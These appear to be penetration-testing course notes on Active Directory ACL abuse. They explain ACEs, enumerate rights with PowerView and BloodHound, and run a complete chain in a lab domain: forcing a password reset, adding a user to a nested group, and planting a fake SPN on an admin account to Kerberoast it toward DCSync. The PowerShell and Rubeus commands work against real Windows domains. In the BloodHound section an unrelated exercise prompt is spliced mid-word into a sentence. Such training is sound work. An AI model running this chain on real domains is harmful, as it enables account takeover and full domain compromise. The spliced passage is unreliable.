https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/

For security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it.


In their simplest form, ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called Access Control Entities (ACEs). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.


There are two types of ACLs:

Discretionary Access Control List (DACL) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.

System Access Control Lists (SACL) - allow administrators to log access attempts made to secured objects.



There are three main types of ACEs(Access Control Entitie) that can be applied to all securable objects in AD:


|    ACE 	          |           Description   |
|---------------------|-------------------------|
|Access denied 	  |  Used within a DACL to show that a user or group is explicitly denied access to an object|
|Access allowed  	 |   Used within a DACL to show that a user or group is explicitly granted access to an object|
|System audit  	  |  Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred|


Each ACE is made up of the following four components:

- The security identifier (SID) of the user/group that has access to the object (or principal name graphically)
    
- A flag denoting the type of ACE (access denied, allowed, or system audit ACE)
    
- A set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object
    
- An access mask which is a 32-bit value that defines the rights granted to an object



### Why are ACEs Important?

Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the "low hanging fruit" AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:

- ForceChangePassword abused with Set-DomainUserPassword
    
- Add Members abused with Add-DomainGroupMember
    
- GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember
    
- GenericWrite abused with Set-DomainObject
    
- WriteOwner abused with Set-DomainObjectOwner
    
- WriteDACL abused with Add-DomainObjectACL
    
-   AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
    
-   Addself abused with Add-DomainGroupMember

- ForceChangePassword - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).
   
   
   
- GenericWrite - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.
    
    
- AddSelf - shows security groups that a user can add themselves to.
    
    
    
- GenericAll - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.



Some common attack scenarios may include:


|Attack | Description|
|------|-------------|
|Abusing forgot password permissions |	Help Desk and other IT users are often granted permissions to perform password resets and other privileged tasks. If we can take over an account with these privileges (or an account in a group that confers these privileges on its users), we may be able to perform a password reset for a more privileged account in the domain.|
|Abusing group membership management |	It's also common to see Help Desk and other staff that have the right to add/remove users from a given group. It is always worth enumerating this further, as sometimes we may be able to add an account that we control into a privileged built-in AD group or a group that grants us some sort of interesting privilege.|
|Excessive user rights |	We also commonly see user, computer, and group objects with excessive rights that a client is likely unaware of. This could occur after some sort of software install (Exchange, for example, adds many ACL changes into the environment at install time) or some kind of legacy or accidental configuration that gives a user unintended rights. Sometimes we may take over an account that was given certain rights out of convenience or to solve a nagging problem more quickly.|





## ACL Enumeration


### Enumerating ACLs with PowerView
    
We can use PowerView to enumerate ACLs, but the task of digging through all of the results will be extremely time-consuming and likely inaccurate. For example, if we run the function Find-InterestingDomainAcl we will receive a massive amount of information back that we would need to dig through to make any sense of:

```
PS C:\htb> Find-InterestingDomainAcl
```

Now, there is a way to use a tool such as PowerView more effectively -- by performing targeted enumeration starting with a user that we have control over. Let's focus on the user wley, which we obtained after solving the last question in the LLMNR/NBT-NS Poisoning - from Linux section. Let's dig in and see if this user has any interesting ACL rights that we could take advantage of. We first need to get the SID of our target user to search effectively.
```
    PS C:\htb> Import-Module .\PowerView.ps1
    PS C:\htb> $sid = Convert-NameToSid wley
```

### Using Get-DomainObjectACL



We can then use the Get-DomainObjectACL function to perform our targeted search. In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user's SID using the $sid variable to the SecurityIdentifier property which is what tells us who has the given right over an object. One important thing to note is that if we search without the flag ResolveGUIDs, we will see results like the below, where the right ExtendedRight does not give us a clear picture of what ACE entry the user wley has over damundsen. This is because the ObjectAceType property is returning a GUID value that is not human readable.

```
PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
We could Google for the GUID value 00299570-246d-11d0-a768-00aa006e0529 and uncover this page showing that the user has the right to force change the other user's password. Alternatively, we could do a reverse search using PowerShell to map the right name back to the GUID value.
```
PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"

PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```
This gave us our answer, but would be highly inefficient during an assessment. PowerView has the ResolveGUIDs flag, which does this very thing for us. Notice how the output changes when we include this flag to show the human-readable format of the ObjectAceType property as User-Force-Change-Password.

```
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```
Why did we walk through this example when we could have just searched using ResolveGUIDs first?

It is essential that we understand what our tools are doing and have alternative methods in our toolkit in case a tool fails or is blocked. Before moving on, let's take a quick look at how we could do this using the Get-Acl and Get-ADUser cmdlets which we may find available to us on a client system.



### Creating a List of Domain Users
```
PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

We then read each line of the file using a foreach loop, and use the Get-Acl cmdlet to retrieve ACL information for each domain user by feeding each line of the ad_users.txt file to the Get-ADUser cmdlet. We then select just the Access property, which will give us information about access rights. Finally, we set the IdentityReference property to the user we are in control of (or looking to see what rights they have), in our case, wley.

```
PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```

Once we have this data, we could follow the same methods shown above to convert the GUID to a human-readable format to understand what rights we have over the target user.

So, to recap, we started with the user wley and now have control over the user damundsen via the User-Force-Change-Password extended right. Let's use Powerview to hunt for where, if anywhere, control over the damundsen account could take us.

```
PS C:\htb> $sid2 = Convert-NameToSid damundsen

PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```


Now we can see that our user damundsen has GenericWrite privileges over the Help Desk Level 1 group. This means, among other things, that we can add any user (or ourselves) to this group and inherit any rights that this group has applied to it. A search for rights conferred upon this group does not return anything interesting.

Let's look and see if this group is nested into any other groups, remembering that nested group membership will mean that any users in group A will inherit all rights of any group that group A is nested into (a member of). A quick search shows us that the Help Desk Level 1 group is nested into the Information Technology group, meaning that we can obtain any rights that the Information Technology group grants to its members if we just add ourselves to the Help Desk Level 1 group where our user damundsen has GenericWrite privileges.

```
PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```

This is a lot to digest! Let's recap where we're at:

We have control over the user wley whose hash we retrieved earlier in the module (assessment) using Responder and cracked offline using Hashcat to reveal the cleartext password value
We enumerated objects that the user wley has control over and found that we could force change the password of the user damundsen
From here, we found that the damundsen user can add a member to the Help Desk Level 1 group using GenericWrite privileges
The Help Desk Level 1 group is nested into the Information Technology group, which grants members of that group any rights provisioned to the Information Technology group

Now let's look around and see if members of Information Technology can do anything interesting. Once again, doing our search using Get-DomainObjectACL shows us that members of the Information Technology group have GenericAll rights over the user adunn, which means we could:

Modify group membership
Force change a password
Perform a targeted Kerberoasting attack and attempt to crack the user's password if it is weak

```
PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
```

Finally, let's see if the adunn user has any type of interesting access that we may be able to leverage to get closer to our goal.

 ```   
PS C:\htb> $adunnsid = Convert-NameToSid adunn 

PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
```
The output above shows that our adunn user has DS-Replication-Get-Changes and DS-Replication-Get-Changes-In-Filtered-Set rights over the domain object. This means that this user can be leveraged to perform a DCSync attack. We will cover this attack in-depth in the DCSync section.




### Enumerating ACLs with BloodHound


we can set the wley user as our starting node, select the Node Info tab and scroll down to Outbound Control Rights. This option will show us objects we have control over directly, via group membership, and the number of objects that our user could lead to us controlling via ACL attack paths under Transitive Object Control. If we click on the 1 next to First Degree Object Control, we see the first set of rightUsing the skills learned in this section, enumerate the ActiveDirectoryRights that the user forend has over the user dpayne (Dagmar Payne). s that we enumerated, ForceChangePassword over the damundsen user.

If we right-click on the line between the two objects, a menu will pop up. If we select Help, we will be presented with help around abusing this ACE, including:

More info on the specific right, tools, and commands that can be used to pull off this attack
        
Operational Security (Opsec) considerations
        
External references.

### ACL Abuse Tactics


Abusing ACLs

Once again, to recap where we are and where we want to get to. We are in control of the wley user whose NTLMv2 hash we retrieved by running Responder earlier in the assessment. Lucky for us, this user was using a weak password, and we were able to crack the hash offline using Hashcat and retrieve the cleartext value. We know that we can use this access to kick off an attack chain that will result in us taking control of the adunn user who can perform the DCSync attack, which would give us full control of the domain by allowing us to retrieve the NTLM password hashes for all users in the domain and escalate privileges to Domain/Enterprise Admin and even achieve persistence. To perform the attack chain, we have to do the following:

- Use the wley user to change the password for the damundsen user
        
- Authenticate as the damundsen user and leverage GenericAll rights to add a user that we control to the Help Desk Level 1 group
- Take advantage of nested group membership in the Information Technology group and leverage 
- GenericAll rights to take control of the adunn user

So, first, we must authenticate as wley and force change the password of the user damundsen. We can start by opening a PowerShell console and authenticating as the wley user. Otherwise, we could skip this step if we were already running as this user. To do this, we can create a PSCredential object.



#### Creating a PSCredential Object
```
    PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force

    PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 

    \\Creating a SecureString Object

    PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

#### Changing the User's Password

Finally, we'll use the Set-DomainUserPassword PowerView function to change the user's password. We need to use the -Credential flag with the credential object we created for the wley user. It's best to always specify the -Verbose flag to get feedback on the command completing as expected or as much information about errors as possible. We could do this from a Linux attack host using a tool such as pth-net, which is part of the pth-toolkit.

```
PS C:\htb> cd C:\Tools\

PS C:\htb> Import-Module .\PowerView.ps1

PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

Next, we need to perform a similar process to authenticate as the damundsen user and add ourselves to the Help Desk Level 1 group.


#### Creating a SecureString Object using damundsen

```
    PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
    PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

Next, we can use the Add-DomainGroupMember function to add ourselves to the target group. We can first confirm that our user is not a member of the target group. This could also be done from a Linux host using the pth-toolkit.

#### Adding damundsen to the Help Desk Level 1 Group
```
    PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

    PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```


At this point, we should be able to leverage our new group membership to take control over the adunn user. Now, let's say that our client permitted us to change the password of the damundsen user, but the adunn user is an admin account that cannot be interrupted. Since we have GenericAll rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's servicePrincipalName attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.

We must be authenticated as a member of the Information Technology group for this to be successful. Since we added damundsen to the Help Desk Level 1 group, we inherited rights via nested group membership. We can now use Set-DomainObject to create the fake SPN. We could use the tool targetedKerberoast to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.

#### Creating a Fake SPN
```
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
#### Kerberoasting with Rubeus
```
PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
```

    \\Cleanup

    In terms of cleanup, there are a few things we need to do:

    Remove the fake SPN we created on the adunn user.
   
    Remove the damundsen user from the Help Desk Level 1 group
   
    Set the password for the damundsen user back to its original value (if we know it) or have our client set it/alert the user


    \\Removing the Fake SPN from adunn's Account

    PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

    \\Removing damundsen from the Help Desk Level 1 Group

    PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

    




